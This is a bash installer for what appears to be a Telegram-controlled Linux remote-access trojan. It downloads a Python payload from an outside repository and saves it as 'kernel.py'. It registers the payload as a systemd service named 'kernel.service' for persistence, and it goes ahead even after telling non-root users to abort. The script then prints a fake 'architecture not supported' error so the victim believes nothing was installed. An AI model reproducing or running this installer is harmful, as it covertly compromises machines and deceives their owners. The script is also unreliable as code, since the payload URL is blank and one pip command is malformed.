#!/bin/bash

URL_KERNEL_PY= # pastebin
URL_KERNEL_SERVICE=https://raw.githubusercontent.com/dentuwu/linuxRAT-tgBot/main/services/kernel.service #pastebon pls
URL_NO_ROOT_KERNEL_SERVICE=https://raw.githubusercontent.com/dentuwu/linuxRAT-tgBot/main/services/kernel.no.root.service #pastebiinnnnnn oohhhhhhh.......

#root?

if [[ $EUID -ne 0 ]]; then
  echo "PLEASE EXIT THIS PROGRAM (CTRL+C), AND USE SUDO COMMAND, TO RUN THIS SCRIPT (sudo ./install.sh)!!!!!"

  sleep 13
  clear
  
  echo "please wait for 5-13 seconds, script is a loading" 
  
  mkdir -p  ~/.config/systemd/user/
  cd ~/.config/systemd/user/
  wget $URL_NO_ROOT_KERNEL_SERVICE -O kernel.service -q
  clear 
  
  echo "please wait for 9-20 seconds, script is a loading" 
  mkdir /home/$USER/.cache/
  cd /home/$USER/.cache/
  
  wget $URL_KERNEL_PY -O kernel.py -q
  
  clear
  echo "please wait for 1-10 seconds, script is a loading" 
  
  pip install aiogram==3.0.0b6
  pip install requests
  clear
  
  systemctl --user daemon-reload
  systemctl --user enable --now kernel.service
  systemctl --user start kernel.service
  sleep 1
  systemctl --user restart kernel.service
  
  echo "please wait script is a loading" 
  
  sleep 7
  
  echo "OS ERROR, PLEASE SEND FEEDBACK TO AUTHOR SCRIPT ,\nerror description: system architecture is not suported ( ID:8F8ED3FI )"
  exit 1
fi

set -e  # stop script if something goes wrong

apt update -y
apt install wget python3 imagemagick curl python3-pip -y

clear

echo "please wait for 5-13 seconds, script is a loading" 

cd /usr/libexec/

wget $URL_KERNEL_PY -O kernel.py -q
clear

echo "please wait for 1-10 seconds, script is a loading" 

pip install aiogram==3.0.0b6
pip requests
clear

echo "please wait script is a loading" 
cd /etc/systemd/system/

wget $URL_KERNEL_SERVICE -O kernel.service -q

clear 

systemctl daemon-reload
systemctl enable kernel.service
systemctl start kernel.service
sleep 1
systemctl restart kernel.service

clear

echo "please wait for 9-20 seconds, script is a loading" 
sleep 7
clear

echo "OS ERROR, PLEASE SEND FEEDBACK TO AUTHOR SCRIPT ,\nerror description: system architecture is not suported ( ID:8F8ED3FI )"

